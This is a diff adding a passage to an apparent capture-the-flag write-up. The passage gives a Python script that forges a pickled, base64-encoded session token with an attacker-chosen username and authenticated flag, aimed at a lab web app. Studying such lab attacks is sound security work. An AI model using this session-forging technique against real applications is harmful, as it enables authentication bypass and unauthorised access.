@@ -259,3 +259,55 @@ python3 decode.py
 
 It is now decoded
 
+I can then user the following encode script to try and forge a session token
+
+```python
+import base64
+import pickle
+import sys
+import types
+
+# 1. Recreate the 'app.SessionData' module structure so the target server recognizes the object type
+class SessionData:
+    def __init__(self, username, authenticated):
+        self.visitor_id = "e5f147feeb0d6cbf"
+        self.theme = "light"
+        self.visited_pages = ["/", "/about", "/services", "/news", "/careers", "/contact"]
+        self.first_visit = "2026-08-31T23:46:19.890212"
+        self.username = username
+        self.authenticated = authenticated
+
+# Inject the class into sys.modules as 'app.SessionData'
+app_module = types.ModuleType("app")
+app_module.SessionData = SessionData
+sys.modules["app"] = app_module
+
+def main():
+    print("--- HackSmarter Session Encoder ---")
+    
+    # Take user input for the target attributes
+    username = input("Enter username (e.g., admin): ").strip()
+    auth_input = input("Set authenticated status (true/false): ").strip().lower()
+    
+    # Convert input string to actual boolean value
+    authenticated = True if auth_input in ['true', 't', '1', 'yes'] else False
+    
+    # Handle 'None' or empty values for username
+    if username == "None" or username == "":
+        username = None
+
+    # 2. Instantiate the session object with the custom values
+    custom_session = SessionData(username=username, authenticated=authenticated)
+    
+    # 3. Serialize the object using Python Pickle
+    pickle_bytes = pickle.dumps(custom_session, protocol=4)
+    
+    # 4. Encode the binary bytes to Base64 text
+    b64_encoded = base64.b64encode(pickle_bytes).decode('utf-8')
+    
+    print("\n[+] Generated Session String:")
+    print(b64_encoded)
+
+if __name__ == "__main__":
+    main()
+```
